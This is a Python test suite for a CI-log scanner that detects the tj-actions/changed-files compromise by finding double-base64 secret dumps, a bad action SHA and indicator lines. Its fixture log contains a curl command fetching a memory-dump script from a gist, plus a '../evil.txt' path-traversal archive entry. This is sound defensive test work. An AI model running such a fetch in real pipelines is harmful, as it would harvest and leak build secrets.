import base64
import dataclasses
import hashlib
import io
import json
import zipfile

import pytest

from scoper.logs import (
    decode_double_b64,
    extract_secrets,
    fingerprint,
    scan_logs,
)

from .canary import CANARIES, double_b64, dump
from .conftest import TJ_BAD

TS = "2025-03-14T16:20:31.4719327Z "


def leak_log() -> str:
    blob = double_b64(dump(CANARIES))
    return "\n".join(
        [
            TS + "##[group]Run tj-actions/changed-files@v45",
            TS + f"Download action repository 'tj-actions/changed-files@v45' (SHA:{TJ_BAD})",
            TS
            + "curl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py",
            TS + blob,
            TS + "##[endgroup]",
        ]
    )


BENIGN = "\n".join(
    [
        TS + "Run actions/checkout@v4",
        TS + "sha256:" + hashlib.sha256(b"x").hexdigest(),
        TS + "Uploading artifact " + base64.b64encode(bytes(range(256))).decode(),
        TS + "Encoded: " + base64.b64encode(b"just a single layer of base64 text here").decode(),
        TS + "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
        TS + "AKIA mentioned in docs without a key",
    ]
)


def test_double_b64_roundtrip():
    assert decode_double_b64(double_b64("hello secret world")) == "hello secret world"


@pytest.mark.parametrize(
    "token",
    [
        base64.b64encode(b"single layer of base64, plain text inside").decode(),
        base64.b64encode(bytes(range(200))).decode(),
        "A" * 64,
        hashlib.sha256(b"a").hexdigest(),
    ],
)
def test_double_b64_rejects_non_blobs(token):
    assert decode_double_b64(token) is None


def test_extract_secrets_types_and_fingerprints():
    found = {s.name: s for s in extract_secrets(dump(CANARIES))}
    assert set(found) == set(CANARIES)
    assert found["AWS_ACCESS_KEY_ID"].type_hint == "aws-access-key-id"
    assert found["GH_PAT"].type_hint == "github-token"
    assert found["NPM_TOKEN"].type_hint == "npm-token"
    assert found["PLAIN_SECRET"].type_hint is None
    assert found["PLAIN_SECRET"].fingerprint == fingerprint(CANARIES["PLAIN_SECRET"])


def test_extract_secrets_env_fallback():
    found = extract_secrets("FOO=bar1\nBAZ = qux2\n")
    assert {s.name for s in found} == {"FOO", "BAZ"}


def test_scan_finds_all_three_signals(tmp_path, incidents):
    f = tmp_path / "1_build.txt"
    f.write_text(leak_log())
    scan = scan_logs(f, incidents)
    kinds = sorted({x.kind for x in scan.findings})
    assert kinds == ["b64x2", "ioc", "sha"]
    blob = next(x for x in scan.findings if x.kind == "b64x2")
    assert blob.incident == "CVE-2025-30066" and blob.line == 4
    assert {s.name for s in blob.secrets} == set(CANARIES)


def test_secret_values_never_in_results(tmp_path, incidents):
    f = tmp_path / "1_build.txt"
    f.write_text(leak_log())
    scan = scan_logs(f, incidents)
    dumped = json.dumps(dataclasses.asdict(scan)) + repr(scan)
    for value in CANARIES.values():
        assert value not in dumped
        assert value.split("\\n")[1 if "\\n" in value else 0] not in dumped


def test_benign_log_is_quiet(tmp_path, incidents):
    f = tmp_path / "ok.txt"
    f.write_text(BENIGN)
    scan = scan_logs(f, incidents)
    assert scan.findings == [] and scan.errors == []


def test_zip_archive_and_directory(tmp_path, incidents):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("build/2_Get changed files.txt", leak_log())
        zf.writestr("build/1_Set up job.txt", BENIGN)
        zf.writestr("../evil.txt", BENIGN)  # never extracted, just read
    z = tmp_path / "logs_123.zip"
    z.write_bytes(buf.getvalue())
    scan = scan_logs(z, incidents)
    assert len(scan.sources) == 3
    assert all(x.source.startswith("logs_123.zip!build/2_") for x in scan.findings)
    d = tmp_path / "dir"
    d.mkdir()
    (d / "a.txt").write_text(leak_log())
    (d / "b.txt").write_text(BENIGN)
    assert len(scan_logs(d, incidents).findings) == 3


def test_oversized_member_skipped(tmp_path, incidents, monkeypatch):
    import scoper.logs as logs

    monkeypatch.setattr(logs, "MAX_MEMBER_BYTES", 10)
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        zf.writestr("big.txt", "x" * 100)
    z = tmp_path / "big.zip"
    z.write_bytes(buf.getvalue())
    scan = logs.scan_logs(z, incidents)
    assert scan.sources == [] and "too large" in scan.errors[0]


def test_missing_path_reported(tmp_path, incidents):
    scan = scan_logs(tmp_path / "nope", incidents)
    assert "does not exist" in scan.errors[0]
